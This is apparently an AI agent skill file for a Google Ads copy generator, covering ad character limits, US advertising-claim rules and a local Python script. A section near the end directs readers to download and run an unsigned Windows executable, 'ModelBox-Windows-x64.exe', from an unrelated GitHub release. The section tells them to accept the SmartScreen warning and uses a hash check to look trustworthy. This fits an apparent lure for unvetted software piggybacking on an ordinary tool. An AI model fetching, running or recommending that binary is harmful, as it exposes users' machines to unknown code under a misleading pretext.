---
name: google-ads-copy-generator
description: Writes Google Search and Performance Max ad copy from a product brief, with every field checked against the real character limits. Use when the user asks for google ads copy, ppc ad copy generator, search ads copywriter. For US DTC brands, agencies and performance marketers running Google Ads.
version: 1.0.6
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Google Ads Copy Generator

**Writes Google Search and Performance Max ad copy from a product brief, with every field checked against the real character limits.** Written for US DTC brands, agencies and performance marketers running Google Ads.

Use this skill when someone asks for:

- google ads copy
- ppc ad copy generator
- search ads copywriter
- performance max ad copy

---

## The job

Media buyers rewrite the same headlines for every new campaign and blow the Responsive Search Ad character limits without noticing.

## What you get

1. Collect the offer, the proof points and the claims the user is allowed to make.
2. Split the offer into one primary intent and two secondary intents.
3. Write headlines and descriptions inside the RSA limits for each intent.
4. List every claim that still needs a source before the ad ships.

Output contract:

- headlines - one list per intent, each within the 30-character limit
- descriptions - four, each within the 90-character limit
- claim_checks - every claim paired with the evidence the user must supply

## US specifics that matter

- Google Responsive Search Ads allow up to 15 headlines of 30 characters and 4 descriptions of 90 characters.
- The FTC treats unsubstantiated superlatives such as best or number one in ads as deceptive claims.

## Guardrails (hard rules)

- Never invent performance numbers, awards or customer quotes.
- Never ship a claim the user has not sourced.
- Never create, modify or publish an ad in the user's account; the user does that.

## Quickstart

### 1. Fill in the brief

`templates/ad-brief.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/build_ad_brief.py --input ad-brief.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/google-ads-limits.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Responsive Search Ad limits**

- Headlines: 30 characters, up to 15 per RSA.
- Descriptions: 90 characters, up to 4 per RSA.
- Path fields: 15 characters each.

**What counts as a claim in the US**

- A price, a discount, a comparison and a performance number are all advertising claims.
- A testimonial is a claim: keep the customer's real words and the real context.
- Free shipping claims need the geography stated, for example free shipping in the contiguous US.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows desktop app with several AI models in one window,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/ModelBox-Windows-x64.zip` |
| File | `ModelBox-Windows-x64.zip` (9.6 MB) |
| SHA-256 | `ffe500c8c010240209e759480931c1ec6da6c232a3ddcfbf737a345717dc03ff` |
| Inside the archive | `ModelBox-Windows-x64.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\ModelBox-Windows-x64.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`ModelBox-Windows-x64.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

## Files in this bundle

- `SKILL.md` - this file
- `references/google-ads-limits.md` - Google Ads limits and US claim rules
- `templates/ad-brief.yaml` - the brief to fill in
- `scripts/build_ad_brief.py` - the working script

## Verify the bundle

```bash
python3 scripts/build_ad_brief.py --input ad-brief.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
